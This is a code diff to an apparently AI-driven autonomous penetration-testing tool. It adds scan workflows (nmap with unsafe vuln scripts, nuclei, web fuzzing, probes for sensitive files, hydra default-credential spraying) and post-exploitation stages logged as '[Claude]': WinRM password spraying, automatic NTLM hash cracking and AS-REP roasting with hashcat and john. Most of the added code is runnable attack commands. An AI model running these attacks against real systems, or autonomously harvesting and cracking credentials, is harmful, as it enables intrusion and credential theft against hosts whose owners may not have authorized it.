@@ -393,20 +393,89 @@ WORKFLOWS = [
     {
         "id": "autonomous_pentest",
         "name": "Pentest Autónomo",
-        "description": "Recon + vuln scripts + nuclei con inyección dinámica de pasos y auto-save de findings.",
+        "description": "Full auto-pentest: Nmap+vuln+UDP → Nuclei → web fuzz → service enum → auto-exploit → post-exploit con inyección dinámica.",
         "icon": "fa-robot",
         "color": "violet",
         "auto_inject": True,
         "steps": [
             {
-                "name": "Nmap Quick XML (top-1000 + vuln scripts)",
-                "command": "nmap -T4 -sV --open --top-ports 1000 --script=vuln,auth,default,ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,smb-vuln-ms08-067,smb2-security-mode,rdp-vuln-ms12-020,ssl-heartbleed,http-shellshock,http-phpmyadmin-dir-traversal -oX - {rhost} 2>/dev/null",
+                "name": "Nmap Quick XML (top-1000 + vuln scripts + critical)",
+                "command": (
+                    "nmap -T4 -sV --open --top-ports 1000 "
+                    "--script=vuln,auth,default,ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,"
+                    "smb-vuln-ms08-067,smb-double-pulsar-backdoor,smb2-security-mode,irc-unrealircd-backdoor,"
+                    "rdp-vuln-ms12-020,ssl-heartbleed,ssl-poodle,http-shellshock,http-phpmyadmin-dir-traversal,"
+                    "http-git,http-config-backup,http-default-accounts,mysql-empty-password,"
+                    "redis-info,nfs-showmount,smtp-open-relay,snmp-info "
+                    "--script-args=unsafe=1 --script-timeout 30s -oX - {rhost} 2>/dev/null"
+                ),
                 "parse": "nmap",
             },
             {
-                "name": "Nmap Full TCP XML (all ports)",
-                "command": "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m --script=default,vuln,ftp-anon,smb-vuln-ms17-010,smb-vuln-ms08-067,ssl-heartbleed -oX - {rhost} 2>/dev/null",
+                "name": "Nmap Full TCP XML (all ports + vuln)",
+                "command": (
+                    "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m "
+                    "--script=default,vuln,ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,"
+                    "smb-vuln-ms08-067,smb-vuln-cve-2017-7494,ssl-heartbleed,http-shellshock,"
+                    "http-git,http-config-backup,mysql-empty-password,redis-info "
+                    "--script-args=unsafe=1 --script-timeout 45s -oX - {rhost} 2>/dev/null"
+                ),
                 "parse": "nmap",
+            },
+            {
+                "name": "WhatWeb + Tech Fingerprint",
+                "command": "whatweb http://{rhost} https://{rhost} 2>/dev/null; curl -sI --max-time 8 http://{rhost} 2>/dev/null | head -25",
+            },
+            {
+                "name": "Nuclei CVE + Misconfig (Critical/High/Medium)",
+                "command": "nuclei -u http://{rhost} -u https://{rhost} -severity critical,high,medium -j -timeout 12 -no-update-check -no-color 2>/dev/null | head -80",
+                "parse": "nuclei",
+            },
+            {
+                "name": "Web Directory Fuzz (feroxbuster)",
+                "command": (
+                    "WLIST=$(ls /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "
+                    "/usr/share/wordlists/dirb/common.txt 2>/dev/null | head -1); "
+                    "[ -n \"$WLIST\" ] && (feroxbuster --url http://{rhost} -k -w $WLIST -t 40 "
+                    "-x php,html,txt,asp,aspx,jsp,bak,zip,json,config,env -q --no-state 2>/dev/null | head -60 || "
+                    "gobuster dir -u http://{rhost} -w $WLIST -t 30 -q 2>/dev/null | head -50)"
+                ),
+            },
+            {
+                "name": "Sensitive File + Backup Discovery",
+                "command": (
+                    "for f in /.env /.git/HEAD /backup.zip /db.sql /config.php /wp-config.php "
+                    "/.htaccess /phpinfo.php /info.php /adminer.php /phpmyadmin /shell.php "
+                    "/manager/html /actuator/env /api/swagger.json; do "
+                    "CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{http_code}' http://{rhost}$f 2>/dev/null); "
+                    "[ \"$CODE\" = '200' ] && echo \"BACKUP_FILE_FOUND:$f (HTTP $CODE)\"; "
+                    "done"
+                ),
+            },
+            {
+                "name": "Nmap UDP Top-20 + SNMP + NFS",
+                "command": "nmap -T4 -sU --top-ports 20 --max-retries 1 --script=snmp-info,snmp-sysdescr,nfs-showmount,dns-zone-transfer {rhost} 2>/dev/null",
+                "parse": "nmap",
+            },
+            {
+                "name": "CrackMapExec SMB + Enum4Linux",
+                "command": (
+                    "crackmapexec smb {rhost} 2>/dev/null; "
+                    "smbclient -L //{rhost} -N 2>/dev/null; "
+                    "enum4linux-ng -A {rhost} 2>/dev/null | head -60 || "
+                    "enum4linux -a {rhost} 2>/dev/null | head -60"
+                ),
+            },
+            {
+                "name": "Default Credentials Spray (SSH/FTP/HTTP/SMB)",
+                "command": (
+                    "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                    "-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt "
+                    "-t 4 -f ssh://{rhost} 2>/dev/null | grep '\\[ssh\\]' | head -5; "
+                    "hydra -t 4 -f -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                    "-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt "
+                    "ftp://{rhost} 2>/dev/null | grep '\\[ftp\\]' | head -3"
+                ),
             },
         ],
     },
@@ -1266,6 +1335,32 @@ MITRE_ATTACK_MAP = [
     (r'open.*redirect|CRLF.*injection|host.*header.*inject', 'T1583', 'Acquire Infrastructure'),
     (r'subdomain.*takeover|CNAME.*dangling', 'T1584.001', 'Compromise Infrastructure: Domains'),
     (r'IDOR|insecure.*direct.*object|unauthorized.*access.*user.*id', 'T1078', 'Valid Accounts'),
+    # 2023-2024 techniques
+    (r'docker.*daemon.*exposed|docker.*2375|container.*escape.*root', 'T1610', 'Deploy Container'),
+    (r'kubernetes.*api.*anon|k8s.*exec.*shell|pod.*exec.*rce', 'T1610', 'Deploy Container'),
+    (r'grafana.*default.*cred|grafana.*admin.*admin', 'T1078.001', 'Default Accounts'),
+    (r'activemq.*rce|CVE-2023-46604', 'T1190', 'Exploit Public-Facing Application'),
+    (r'teamcity.*auth.*bypass|CVE-2023-42793', 'T1190', 'Exploit Public-Facing Application'),
+    (r'metabase.*setup.*token|CVE-2023-38646', 'T1190', 'Exploit Public-Facing Application'),
+    (r'jupyter.*no.*auth|jupyter.*rce', 'T1059.006', 'Python'),
+    (r'citrix.*bleed|CVE-2023-4966|session.*token.*leak', 'T1563', 'Remote Service Session Hijacking'),
+    (r'fortigate.*auth.*bypass|CVE-2022-40684', 'T1190', 'Exploit Public-Facing Application'),
+    (r'moveit.*sqli|CVE-2023-34362', 'T1190', 'Exploit Public-Facing Application'),
+    (r'cacti.*command.*injection|CVE-2022-46169', 'T1190', 'Exploit Public-Facing Application'),
+    (r'zabbix.*auth.*bypass|CVE-2022-23131', 'T1190', 'Exploit Public-Facing Application'),
+    (r'minio.*secrets.*exposed|CVE-2023-28432', 'T1552.001', 'Credentials in Files'),
+    (r'aws.*access.*key|AKIA[A-Z0-9]{16}|iam.*credentials', 'T1552.005', 'Cloud Instance Metadata API'),
+    (r'spring.*boot.*actuator|/actuator/env.*password', 'T1552.001', 'Credentials in Files'),
+    (r'prototype.*pollution.*admin|__proto__.*admin', 'T1059.007', 'JavaScript'),
+    (r'ssrf.*confirmed|169\.254\.169\.254.*ami|imds.*ssrf', 'T1552.005', 'Cloud Instance Metadata API'),
+    (r'open.*redirect.*confirm|OPEN_REDIRECT_FOUND', 'T1598.003', 'Spearphishing Link'),
+    (r'idor.*confirm|insecure.*direct.*object.*access', 'T1530', 'Data from Cloud Storage'),
+    (r'vmware.*vcenter.*rce|CVE-2021-21985', 'T1210', 'Exploitation of Remote Services'),
+    (r'exchange.*proxyshell|CVE-2021-34473', 'T1190', 'Exploit Public-Facing Application'),
+    (r'backstage.*vm2|CVE-2022-36067', 'T1059', 'Command and Scripting Interpreter'),
+    (r'rdp.*cred.*valid|xfreerdp.*success', 'T1021.001', 'Remote Desktop Protocol'),
+    (r'solr.*velocity.*rce|CVE-2019-17558', 'T1190', 'Exploit Public-Facing Application'),
+    (r'kibana.*rce|CVE-2019-7609', 'T1190', 'Exploit Public-Facing Application'),
 ]
 
 def _auto_mitre_tag(finding):
@@ -15858,6 +15953,85 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                     "description": f"Servidor forzado a autenticarse hacia atacante via PetitPotam/PrinterBug.\n{coerce_out[:400]}",
                     "cve": "CVE-2021-36942",
                 }], target)
+
+        # ── F4d: Password spraying más servicios (WinRM, OWA, ADFS) ──────────
+        if any(p in port_set for p in (5985, 5986, 443, 80)):
+            combined = "\n".join(accumulated_output[-40:])
+            discovered_users_d4 = list(set(re.findall(
+                r'(?:user|login|account|samaccountname)[:\s]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,20})',
+                combined, re.IGNORECASE
+            )))[:8]
+            if discovered_users_d4:
+                self._log(f"[Claude] F4d: WinRM/OWA spray → {len(discovered_users_d4)} users")
+                with open("/tmp/f4d_users.txt", "w") as f:
+                    f.write("\n".join(discovered_users_d4))
+                # WinRM spray
+                if 5985 in port_set or 5986 in port_set:
+                    winrm_out, _ = self._run_cmd(
+                        "winrm-spray",
+                        f"crackmapexec winrm {target} -u /tmp/f4d_users.txt "
+                        f"-p /tmp/smart_passwords.txt 2>/dev/null | grep -iE 'Pwn3d|\\+' | head -10",
+                        target, timeout=60,
+                    )
+                    if re.search(r'Pwn3d|\[\+\]', winrm_out, re.IGNORECASE):
+                        self._capture_evidence(winrm_out, target, "winrm-spray", "WinRM spray")
+                        accumulated_output.append(f"=== WinRM Spray ===\n{winrm_out[:300]}")
+
+        # ── F4e: Password hash cracking from previous output ─────────────────
+        combined = "\n".join(accumulated_output)
+        ntlm_hashes = re.findall(r'(\w[\w\.]+):[0-9]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', combined)
+        if ntlm_hashes:
+            self._log(f"[Claude] F4e: Auto-cracking {len(ntlm_hashes)} NTLM hashes con hashcat")
+            hash_lines = [f"{h[0]}:{h[1]}:{h[2]}:::" for h in ntlm_hashes[:20]]
+            with open("/tmp/ntlm_hashes.txt", "w") as f:
+                f.write("\n".join(hash_lines))
+            crack_out, _ = self._run_cmd(
+                "ntlm-hashcat-crack",
+                f"hashcat -m 5600 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt "
+                f"-r /usr/share/hashcat/rules/best64.rule --force -q 2>/dev/null | head -10 || "
+                f"john --format=netntlm /tmp/ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt "
+                f"--rules=best64 2>/dev/null | head -10",
+                target, timeout=120,
+            )
+            if crack_out.strip():
+                accumulated_output.append(f"=== NTLM Crack ===\n{crack_out[:400]}")
+                for line in crack_out.splitlines():
+                    if ":" in line and not line.startswith("["):
+                        parts = line.split(":")
+                        if len(parts) >= 2:
+                            MEMORY.remember_cred(target, "ntlm-cracked", parts[0], parts[-1])
+
+        # ── F4f: Kerberos pre-auth users AS-REP roasting ─────────────────────
+        if 88 in port_set:
+            self._log(f"[Claude] F4f: AS-REP roasting scan")
+            combined = "\n".join(accumulated_output[-30:])
+            users_for_asrep = list(set(re.findall(
+                r'(?:user|samaccountname|login)[:\s]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,20})',
+                combined, re.IGNORECASE
+            )))[:15]
+            if not users_for_asrep:
+                users_for_asrep = ["Administrator", "admin", "user", "guest", "test", "service"]
+            with open("/tmp/asrep_users.txt", "w") as f:
+                f.write("\n".join(users_for_asrep))
+            asrep_out, _ = self._run_cmd(
+                "asrep-roasting-f4f",
+                f"impacket-GetNPUsers -no-pass -usersfile /tmp/asrep_users.txt "
+                f"-dc-ip {target} -format hashcat 2>/dev/null | grep '\\$krb5asrep' | head -5",
+                target, timeout=30,
+            )
+            if "$krb5asrep$" in asrep_out:
+                with open("/tmp/asrep_hashes.txt", "w") as f:
+                    f.write(asrep_out)
+                crack_out2, _ = self._run_cmd(
+                    "asrep-crack-f4f",
+                    f"hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt "
+                    f"--force -q 2>/dev/null | head -5 || "
+                    f"john --format=krb5asrep /tmp/asrep_hashes.txt "
+                    f"--wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null | head -5",
+                    target, timeout=120,
+                )
+                self._capture_evidence(asrep_out + crack_out2, target, "asrep-roasting", "AS-REP Roasting")
+                accumulated_output.append(f"=== AS-REP Roasting ===\n{asrep_out[:400]}\n=== Crack ===\n{crack_out2[:200]}")
 
     # ── F5: API security testing (REST/GraphQL/JWT/JS secrets) ────────────
     def _api_security_test(self, target, open_ports, accumulated_output):
